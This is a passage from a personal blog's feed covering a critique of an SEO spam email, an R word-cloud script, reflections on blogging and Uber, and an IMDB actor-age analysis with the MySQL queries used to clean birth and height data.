<p>Now, I will show you the number of broken links, pages that returned 4XX status code upon request, images with no ALT text, pages with no meta description tag, not having an unique meta description, having too long title, etc., found in your dangoldin.com.</p>
<p>I have a large professional team who can fix all the above issues immediately at an affordable price. I guarantee you will see a drastic change in your Google search ranking once these are fixed.</p>
<p>If this is something you are interested in, then allow me to send you a no obligation audit report.</p>
<p>Best Regards,</p>
<p>XXXXXX</p>
</blockquote>

<p>Clearly this is not personalized as every mention of dangoldin.com can be replaced with another domain and have the same effect. The language doesn’t feel natural and is awkward but the author does include a series of technical words and phrases to showcase his knowledge. I wonder if they have A/B tested the hell out of different copies and ended up coming up with this. I recall reading that Nigerian scammers purposely use non-standard English as a way to identify even better marks. If they wrote in perfect prose they’d end up luring many more people into the top of their funnel that would end up backing out later. Much better to get a smaller set of people hooked that have a higher conversion rate.</p>

<p>The day after my reply I received a PDF titled “<a href="http://dangoldin.com/assets/static/data/website-opt-dangoldin.pdf">Website Analysis for dangoldin.com</a>.” It’s surprisingly well-fleshed out and contains a series of best practices and stats that my site is ranked on. It has the obvious ones such as number of pages indexed by Google as well as some esoteric ones, such as whether it’s listed on “DMOZ.” The analysis ended with a search ranking plan as well as the pricing page with 3 potential plans ranging from $300 to $900 a month. My gut is that this was a dual effort between code and humans with the bulk automatically generated and a human polishing it up. I’m confident that the human component was outsourced given the language and the fact that the firm has presence in India. Generating this was probably cheap but not insignificant and does make me wonder what their conversion rate is. The $300 price point seems high but is in line with the website optimization services out there so maybe these guys have figured out their customer acquisition model.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Word clouds in R</title>
   <link href="http://dangoldin.com/2016/06/06/word-clouds-in-r/"/>
   <updated>2016-06-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/06/word-clouds-in-r</id>
   <content:encoded><![CDATA[
<p>Analyzing my blog is taking longer than expected but my goal is to have something meaningful over the weekend. In the meantime I wanted to share a <a href="http://www.r-bloggers.com/building-wordclouds-in-r/">quick script</a> I discovered to generate a word cloud in R. I remember doing this years back in D3 and having to spend a bunch of time figuring it out. Compared to that doing it in R is a breeze. In this case I have a CSV dump of my blog in /tmp/out.csv and am generating two word clouds - one for keywords and the other for tags of my blog posts.</p>

<figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="c1"># Install and the libraries</span><span class="w">
</span><span class="n">install.packages</span><span class="p">(</span><span class="s2">"tm"</span><span class="p">)</span><span class="w">
</span><span class="n">install.packages</span><span class="p">(</span><span class="s2">"SnowballC"</span><span class="p">)</span><span class="w">
</span><span class="n">install.packages</span><span class="p">(</span><span class="s2">"wordcloud"</span><span class="p">)</span><span class="w">

</span><span class="n">library</span><span class="p">(</span><span class="n">tm</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">SnowballC</span><span class="p">)</span><span class="w">
</span><span class="n">library</span><span class="p">(</span><span class="n">wordcloud</span><span class="p">)</span><span class="w">

</span><span class="c1"># Read the file</span><span class="w">
</span><span class="n">df</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read.csv</span><span class="p">(</span><span class="s2">"/tmp/out.csv"</span><span class="p">,</span><span class="w"> </span><span class="n">header</span><span class="o">=</span><span class="kc">TRUE</span><span class="p">)</span><span class="w">

</span><span class="c1"># Now generate the two word clouds.</span><span class="w">
</span><span class="c1"># Most of the work here is removing the unncessary and common words</span><span class="w">
</span><span class="c1"># as well as optionally stemming each of the words. In my case since</span><span class="w">
</span><span class="c1"># I'm plotting the keywords and tags I ignore this step.</span><span class="w">

</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">Corpus</span><span class="p">(</span><span class="n">VectorSource</span><span class="p">(</span><span class="n">df</span><span class="o">$</span><span class="n">keywords</span><span class="p">))</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">PlainTextDocument</span><span class="p">)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removePunctuation</span><span class="p">)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removeWords</span><span class="p">,</span><span class="w"> </span><span class="n">stopwords</span><span class="p">(</span><span class="s1">'english'</span><span class="p">))</span><span class="w">
</span><span class="c1"># corpus &lt;- tm_map(corpus, stemDocument)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removeWords</span><span class="p">,</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="s1">'the'</span><span class="p">,</span><span class="w"> </span><span class="s1">'this'</span><span class="p">,</span><span class="w"> </span><span class="n">stopwords</span><span class="p">(</span><span class="s1">'english'</span><span class="p">)))</span><span class="w">

</span><span class="n">wordcloud</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">max.words</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">100</span><span class="p">,</span><span class="w"> </span><span class="n">random.order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">scale</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="m">1</span><span class="p">,</span><span class="m">.5</span><span class="p">))</span><span class="w">

</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">Corpus</span><span class="p">(</span><span class="n">VectorSource</span><span class="p">(</span><span class="n">df</span><span class="o">$</span><span class="n">tags</span><span class="p">))</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">PlainTextDocument</span><span class="p">)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removePunctuation</span><span class="p">)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removeWords</span><span class="p">,</span><span class="w"> </span><span class="n">stopwords</span><span class="p">(</span><span class="s1">'english'</span><span class="p">))</span><span class="w">
</span><span class="c1"># corpus &lt;- tm_map(corpus, stemDocument)</span><span class="w">
</span><span class="n">corpus</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">tm_map</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">removeWords</span><span class="p">,</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="s1">'the'</span><span class="p">,</span><span class="w"> </span><span class="s1">'this'</span><span class="p">,</span><span class="w"> </span><span class="n">stopwords</span><span class="p">(</span><span class="s1">'english'</span><span class="p">)))</span><span class="w">

</span><span class="n">wordcloud</span><span class="p">(</span><span class="n">corpus</span><span class="p">,</span><span class="w"> </span><span class="n">max.words</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">100</span><span class="p">,</span><span class="w"> </span><span class="n">random.order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">scale</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="m">1.5</span><span class="p">,</span><span class="m">0.5</span><span class="p">))</span></code></pre></figure>

<img src="http://dangoldin.com/assets/static/images/wordcloud-tags.png" alt="Word cloud of tags" width="392" height="441" layout="responsive"/>
<p class="caption">Word cloud of the tags I use.</p>

<img src="http://dangoldin.com/assets/static/images/wordcloud-keywords.png" alt="Wordcloud of keywords" width="462" height="461" layout="responsive"/>
<p class="caption">Word cloud of the keywords I use.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Blogging: The small wins</title>
   <link href="http://dangoldin.com/2016/06/05/blogging-the-small-wins/"/>
   <updated>2016-06-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/05/blogging-the-small-wins</id>
   <content:encoded><![CDATA[
<p>I started working on a project to investigate my blog posts and see how my writing has evolved over time. I’m still working on it and will definitely write up the results but the entire process got me thinking about my blog and some of the highlights. I started blogging to improve my writing, improve my thinking, and grow my personal brand. Despite being a large time commitment I enjoy doing it and there have been a variety of small episodes that have made it even better:</p>

<ul>
  <li>In 2013 I wrote a <a href="http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone/">short post</a> with an excerpt from a book I was reading about the lack of a dial tone in cell phones. This took off on Hacker News and ended up being covered in <a href="http://gizmodo.com/5994589/why-your-cell-phone-doesnt-have-a-dial-tone">Gizmodo</a>, <a href="http://mentalfloss.com/article/50185/why-don%E2%80%99t-cell-phones-have-dial-tones">Mental Floss</a>, and even made an appearance in the NY Times tech ticker.</li>
  <li>I built a small community. I have a small number of repeat visitors who will comment on the occasional post and I actually ended up meeting up with a frequent contributor, <a href="https://twitter.com/tedder42">Ted</a>, when I visited Portland for the first time.</li>
  <li>When Turo was called RelayRides I did an <a href="http://dangoldin.com/2015/06/07/finding-the-optimal-car-to-list-on-relayrides/">analysis</a> to figure out the optimal car to get that will generate the biggest return. This led to a few people reaching out and me doing a little bit of consulting work to analyze their market.</li>
  <li>I’m a big fan of Citibike and came up with a <a href="https://dangoldin.github.io/citibike-station-directions//">small web app</a> to that translates every New York City trip into a walk to a Citibike station, a station to station bike ride, and then a walk to the final destination. After posting this a few people reached out to ask whether a smartphone app was available as well as ideas to make it even better. I unfortunately haven’t had the chance to work on it but it’s great seeing people finding value in something I’ve done.</li>
  <li>Cities opening up their data and I had some fun visualizing the <a href="http://dangoldin.com/2015/12/12/jersey-city-garbage-truck-routes/">routes of Jersey City’s garbage trucks</a>. This led to me connecting to our councliwoman who then introduced me to the head of Jersey City’s tech innovation team.</li>
  <li>An interesting one was when a journalist from <a href="http://fivethirtyeight.com/">FiveThirtyEight</a> reached out to ask about an old GItHub project I was working on. This ended up not leading anywhere but did provide a glimpse into modern journalism and the desire to highlight and surface content from the tail.</li>
  <li>You know you’ve made it when you have “SEO experts” reaching out and either offering their site optimization services or a payment to post an article with a link to another site. I’ve received dozens of offers so far but haven’t accepted any yet!</li>
</ul>

<p>These are just the highlights and at this point I’m happy to receive any inquiry. None of these have been massive but they’re all small highs that are a reminder that what I write is being read. Their lack wouldn’t stop me from blogging but it’s always nice to receive a surprise comment or email.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Uber and self driving cars</title>
   <link href="http://dangoldin.com/2016/05/28/uber-and-self-driving-cars/"/>
   <updated>2016-05-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/28/uber-and-self-driving-cars</id>
   <content:encoded><![CDATA[
<p>Self driving cars are inevitable and yet I’m surprised by how aggressive Uber is in contributing to the space. Uber is winning right now due to massive network effects. For most drivers and passengers Uber is the primary option and they only switch when Uber is either in surge if you’re a passenger or if you’re a driver when no passengers are available. Self driving cars eliminate half of the market. They won’t need to balance multiple apps on their phones and won’t need to go back and forth trying to find a passenger. It will all happen behind the scenes and do a much better job than any human would. They’d be as likely to work with Uber as any of their competitors. In fact, the entire protocol may evolve to be open with owners setting up their cars to start picking up and dropping off passengers when they’re not in use. The equivalent of how you can sell electricity back into the grid without having to do a ton of extra work. Imagine being able to own a car and just let it roam so it starts earning.</p>

<p>It’s unclear why Uber is driving this change - self driving pose a risk and diminish their competitive advantage. Maybe the outcome will eliminate individual car ownership and Uber wants to own a fleet of these cars. In that case pushing for this result makes sense but carries a world of risks - why wouldn’t car manufacturers both produce the car and have it part of a fleet? The other option is that they accept it’s not ideal but feel as if they have no choice since if others achieve it first they’ll be in an even worse position. Or maybe Uber does think they’ll own the market by the time self driving cars are a reality and at that point no one else will even bother to compete.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing IMDB data: Actors vs actresses</title>
   <link href="http://dangoldin.com/2016/05/22/analyzing-imdb-data-actors-vs-actresses/"/>
   <updated>2016-05-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/22/analyzing-imdb-data-actors-vs-actresses</id>
   <content:encoded><![CDATA[
<p>After getting the <a href="http://dangoldin.com/2016/05/21/analyzing-imdb-data-step-1-cleaning-and-qa/">IMDB data loaded</a> it was time to dive in and start looking at the data. In 2012, I did an <a href="http://dangoldin.com/2012/05/23/trend-of-actor-vs-actress-age-differences/">analysis</a> to examine the way actor and actress ages have changed over time. Unfortunately I did not have a large dataset and had to write a quick crawler to look at the top 50 movies during each decade. This time around, and with the <a href="https://www.curiousgnu.com/imdb-age-distribution">help of CuriousGnu</a>, I was able to get my hands on a much larger dataset. After cleaning and filtering the data I was left with over 208,000 unique actors (~65%) and actresses (~35%) spanning over 371,000 movies. The code is up on <a href="https://github.com/dangoldin/imdb">GitHub</a> and contains both the queries used to pull the data from MonetDB, the R code to generate the charts, and a small script that generated the animation below. If you have suggestions or ideas definitely let me know.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/age-gender.png" alt="Age distribution by gender" width="800" height="800" layout="responsive"/>
      <p>A replication of <a href="https://www.curiousgnu.com/imdb-age-distribution">CuriousGnu's chart</a> as a sanity check to make sure the data was loaded correctly. As one can guess, actresses skew younger compared to actors with an average of 34.6 compared with 41 for actors.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/year-age.png" alt="Average age over time" width="800" height="800" layout="responsive"/>
      <p>The previous chart examined the distribution across the entire date range but we can see how this shift occurred over time. Before the 1940's actors and actresses were much closer in age. Another interesting point is that both actors and actresses have been getting older on average. One theory is that this is a function of the movie industry being new at the beginning of the 20th century with very few actors and actresses at the start that have aged along with the industry. Another reason may be lack of accurate data prior to the 1940s in the IMDB dataset which skews the results toward more recently-born actors and actresses.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/year-age-min-100.png" alt="Average age over time (at least 100 movies)" width="800" height="800" layout="responsive"/>
      <p>Similar to the above but focused on actors and actresses that have appeared in at least 100 movies. The goal here was eliminate some of the noise and focus on the high volume actors and actress. This tells a similar story to the previous chart.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/age-gender-all-decade.png" alt="Age vs gender distribution by decade" width="800" height="800" layout="responsive"/>
      <p>Combining both the distribution and trend over time we can look at the distribution changes over time. This also highlights the bias in the early years - in the 1920s it looks as if no one was older than 30 according to the IMDB data. After some digging around it's due to the lack of birth dates for many of the early 20th century actors and actresses. For example, for movies produced in 1920 we have close to 19,770 actor/actress movie combinations but only 1,060 (~5%) with a birth date. For 2010 the respective numbers are 269,645 and 52,262 (~19%). This causes our distribution to look heavily truncated but ends up correcting itself once we get into the 30s and 40s. In this case the average ages are inaccurate until the 1940s but I suspect the relationship between the genders still holds.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <amp-video controls="" alt="Age vs gender distribution by decade" width="800" height="800" layout="responsive">
        <source src="http://dangoldin.com/assets/static/images/age-gender-decade.mp4" type="video/mp4" />
      </amp-video>
      <p>This is just a timelapse of the data above that makes it much easier to see the shift of the average actor getting older at a faster pace than the average actress.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/gender-production-year-height.png" alt="Height by gender by production year" width="800" height="800" layout="responsive"/>
      <p>In addition to birth date the data also contained the height so I decided to have some fun and see how that looked. This is just a plot of actor and actress height by year of production. My takeaway is that actor heights stayed roughly flat while actress heights have been increasing. Note that since I only had a single height for each person this wouldn't be able to accurately represent children growing up but I imagine those are a small fraction and wouldn't influence the results.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/gender-birth-year-height.png" alt="Height by gender by birth year" width="800" height="800" layout="responsive"/>
      <p>This is an interesting one. Instead of looking at the heights by movie production year this examines heights by birth date of the actor and actresses. In this case we see that actors have stayed roughly the same height while actresses have increased in height over time. There's also a huge looking drop at the end - going from a bit over 70 inches to less than 65 for actors and from 65 inches to less than 63 for actresses. This drop off is in the late 90s which also indicates these are teenagers just growing up.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/gender-num-movies.png" alt="Number of movies by gender" width="800" height="800" layout="responsive"/>
      <p>For the last one I wanted to get a sense of whether actors are more likely to be in more movies than actresses. The chart here is a bit tough to read but it looks at the distribution of actors and actresses by the number of movies made. in this case the scale was massive since there were tons of people who've only been in a few movies so I had to normalize by taking the log. The effect is subtle but the fact that the tail for actors goes wider than the tail for actresses indicates that an average actor is more likely to appear in multiple movies than the average actress.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing IMDB data: Step 1 - Cleaning and QA</title>
   <link href="http://dangoldin.com/2016/05/21/analyzing-imdb-data-step-1-cleaning-and-qa/"/>
   <updated>2016-05-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/05/21/analyzing-imdb-data-step-1---cleaning-and-qa</id>
   <content:encoded><![CDATA[
<p>In 2012 I did a <a href="http://dangoldin.com/2012/05/23/trend-of-actor-vs-actress-age-differences/">simple analysis of IMDB</a> to analyze the change in actor and actresses’s ages over time. At that point I limited the analysis to the top 50 movies each decade and hacked together a quick script to crawl and scrape the IMDB analysis. A couple of weeks ago I came across a great <a href="https://www.curiousgnu.com/imdb-age-distribution">post by CuriousGnu</a> that did a similar analysis across a larger set of movies but limited to movies since 2000. I reached out and they were kind enough to give me a DigitalOcean instance containing the data already loaded into MySQL. The analysis should be finished up tomorrow but I wanted to write this post up to share the mundane parts of the process. The janitorial part is critically important to an analysis and it’s important to get it right or the results will may be meaningless or even completely wrong. The <a href="http://www.nytimes.com/2014/08/18/technology/for-big-data-scientists-hurdle-to-insights-is-janitor-work.html?_r=0">NY Times interviewed</a> a variety of data scientists and came away with the conclusion that 50 to 80 percent of a data scientist’s time is spent cleaning the data. This is no exception and I wanted to provide a sense of the effort and thought that goes into getting data into a state that’s actually useful.</p>

<div class="right10">
    <img src="http://dangoldin.com/assets/static/images/imdb-tables.png" alt="IMDB tables" width="203" height="459"/>
</div>

<p>Lucky for me I already had the data loaded and queryable in MySQL. Most of the time the data is scattered all over the place in a variety of different formats that require a slew of scripts to wrangle and manipulate the data into a useful format.</p>

<p>The first task was to get familiar with the data and I started by looking at sample rows from each of the tables. The table names were descriptive but it turned out that some of them were empty. Running a query that calculated the size of each provided a good idea of where the valuable data was - for my analysis the useful data lived in the title, name, cast_info, and person_info tables.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"> <span class="k">SELECT</span> <span class="k">TABLE_NAME</span><span class="p">,</span> <span class="n">table_rows</span><span class="p">,</span> <span class="n">data_length</span><span class="p">,</span> <span class="n">index_length</span><span class="p">,</span>
<span class="n">round</span><span class="p">(((</span><span class="n">data_length</span> <span class="o">+</span> <span class="n">index_length</span><span class="p">)</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span> <span class="nv">"Size in MB"</span>
<span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="nv">"imdb"</span><span class="p">;</span></code></pre></figure>

<div class="right10">
    <img src="http://dangoldin.com/assets/static/images/imdb-data.png" alt="IMDB data" width="485" height="439" layout="responsive"/>
</div>

<p>The next step was figuring out the way the tables related to one another. Since the field names were obvious this was extremely straightforward. The only nuances came due to an unconventional naming scheme - for example the title table contains the list of movies but the other tables map to it via a movie_id column. Similarly, the name table contains people but it’s referenced via person_id in other tables. They key part here was starting with a movie I know and confirming that the results made sense. In my case I chose my favorite movie, The Rock, and made sure that the results of my query made sense.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span>
<span class="k">from</span> <span class="n">title</span> <span class="n">t</span>
<span class="k">join</span> <span class="n">cast_info</span> <span class="n">ci</span> <span class="k">on</span> <span class="n">t</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">ci</span><span class="p">.</span><span class="n">movie_id</span>
<span class="k">join</span> <span class="n">name</span> <span class="n">n</span> <span class="k">on</span> <span class="n">ci</span><span class="p">.</span><span class="n">person_id</span> <span class="o">=</span> <span class="n">n</span><span class="p">.</span><span class="n">id</span>
<span class="k">where</span> <span class="n">t</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">3569260</span><span class="p">;</span></code></pre></figure>

<p>After getting a feel for the data it was time to actually think about the data necessary for the analysis. To see what was possible I examined the person_info table which contains a variety of information about each person - anywhere from birth and death dates, to spouse, to various names, to height. In my case looking at the birth and height gave me some ideas but I needed to extract these to make them useful. I ended up creating a table for each one and writing a series of queries to populate each one. This required looking at the format of the data in each of the rows and leveraging various combinations of the locate, substring, and cast commands to transform the text fields into something numeric. The birth date was straightforward since it came in two styles - one was just a year and the other was the full birth day with day and month.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">person_birth</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="n">info</span> <span class="k">as</span> <span class="nb">UNSIGNED</span><span class="p">)</span>
    <span class="k">FROM</span> <span class="n">person_info</span>
    <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">21</span>
    <span class="k">AND</span> <span class="k">length</span><span class="p">(</span><span class="n">info</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>

<span class="c1">-- Birthdate is full date so just take the year</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">person_birth</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="k">as</span> <span class="nb">unsigned</span><span class="p">)</span>
    <span class="k">FROM</span> <span class="n">person_info</span>
    <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">21</span>
    <span class="k">AND</span> <span class="k">length</span><span class="p">(</span><span class="n">info</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">;</span></code></pre></figure>

<p>Height was a bit more difficult since it came in a variety of formats. Some were in centimeters, while others were in feet, while others were in feet and inches, with a small fraction having partial inches. Each of these required a complicated series of MySQL commands to convert to inches.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">person_height</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s1">' cm'</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span> <span class="k">as</span> <span class="nb">unsigned</span><span class="p">)</span> <span class="o">*</span> <span class="mi">0</span><span class="p">.</span><span class="mi">393701</span>
    <span class="k">FROM</span> <span class="n">person_info</span>
    <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">22</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">like</span> <span class="s1">'%cm'</span><span class="p">;</span>

<span class="c1">-- No inches</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">person_height</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">12</span>
    <span class="k">FROM</span> <span class="n">person_info</span>
    <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">22</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%cm'</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%/%'</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%"%'</span><span class="p">;</span>

<span class="c1">-- No fractional inches (would also work for no inches but playing it safe)</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">person_height</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">FROM</span> <span class="n">person_info</span>
    <span class="k">WHERE</span> <span class="n">info_type_id</span> <span class="o">=</span> <span class="mi">22</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%cm'</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'%/%'</span>
    <span class="k">AND</span> <span class="n">info</span> <span class="k">like</span> <span class="s1">'%"%'</span><span class="p">;</span>

<span class="c1">-- Fractional inches</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">person_height</span>
    <span class="k">select</span> <span class="n">person_id</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="n">base_height</span> <span class="k">as</span> <span class="nb">decimal</span><span class="p">)</span> <span class="o">+</span> <span class="k">cast</span><span class="p">(</span><span class="n">numerator</span> <span class="k">as</span> <span class="nb">decimal</span><span class="p">)</span><span class="o">/</span><span class="k">cast</span><span class="p">(</span><span class="n">denominator</span> <span class="k">as</span> <span class="nb">decimal</span><span class="p">)</span>
    <span class="k">from</span> <span class="p">(</span>
    <span class="k">SELECT</span> <span class="n">person_id</span><span class="p">,</span> <span class="n">info</span><span class="p">,</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="k">substring</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'"'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="n">locate</span><span class="p">(</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">base_height</span><span class="p">,</span>
